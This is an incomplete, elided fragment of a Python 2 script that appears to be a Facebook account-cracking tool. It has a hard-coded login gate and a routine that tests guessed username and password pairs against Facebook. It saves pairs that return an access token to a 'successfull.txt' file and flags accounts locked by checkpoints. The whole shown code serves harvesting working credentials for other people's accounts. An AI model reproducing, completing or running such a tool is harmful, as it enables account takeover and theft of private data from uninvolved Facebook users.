...
print 'FACEBOOK : SAIFUR RAHMAN'
print 'GITHUB : SAIFUR-2009'
CorrectUsername = 'SAIFUR'
CorrectPassword = 'R@HM@N'
loop = 'true'
while loop == 'true':
    ...
    if username == CorrectUsername:
        ...
        if password == CorrectPassword:
            ...
            os.system('xdg-open https://www.facebook.com/abbu.2454')
    else:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[SAIFUR]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + c + pass1 + '\n')
                okb.close()
                oks.append(c + user + c + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[SR] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [after 09 days]\n'
